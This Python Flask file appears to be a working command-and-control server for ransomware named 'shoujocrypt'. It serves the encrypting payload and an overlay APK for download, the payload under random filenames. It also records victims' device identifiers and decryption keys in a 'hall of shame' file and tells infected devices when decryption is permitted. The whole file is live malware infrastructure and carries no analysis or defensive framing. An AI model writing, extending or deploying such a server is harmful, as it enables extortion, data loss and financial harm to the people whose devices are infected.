from flask import Flask, request, jsonify, send_file, abort
import random
import string
import json
import os

app = Flask(__name__)

db = "hallofshame.jsonc"
payload="../../out/shoujocrypt"
overlay="../../out/overlay.apk"
allowed_devices = []

if not os.path.exists(db):
    exit()

def generate_random_filename(length=8):
    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return f"{name}"

@app.route('/ehe', methods=['GET'])
def ehe():
    if not os.path.exists(payload):
        return jsonify({"error": "Payload not found"}), 404

    random_filename = generate_random_filename()
    return send_file(payload, as_attachment=True, download_name=random_filename)

@app.route('/overlay', methods=['GET'])
def heh():
    if not os.path.exists(payload):
        return jsonify({"error": "Payload not found"}), 404

    random_filename = generate_random_filename()
    return send_file(overlay, as_attachment=True)

def load():
    if not os.path.exists(db):
        return []
    with open(db, 'r') as f:
        lines = f.readlines()
        # Remove comment lines starting with //
        content = ''.join([line for line in lines if not line.strip().startswith("//")])
        try:
            return json.loads(content)
        except json.JSONDecodeError:
            return []


def save_logs(logs):
    with open(db, 'w') as f:
        json.dump(logs, f, indent=2)


@app.route('/upload', methods=['POST'])
def upload():
    data = request.json
    identifier = data.get('identifier')
    dkey = data.get('dkey')

    if not identifier or not dkey:
        return jsonify({"error": "Missing identifier or key"}), 400

    info = load()
    info.append({
        "identifier": identifier,
        "key": dkey
    })
    save_logs(info)

    return jsonify({"status": "ok"})

@app.route("/decrypt/<string:code>", methods=["GET"])
def check_decryption(code):
    # Check if the code is allowed
    if code in allowed_devices:
        # Return 418 if ready to decrypt
        return "", 418
    else:
        # Otherwise return 204 No Content
        return "", 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=25565)
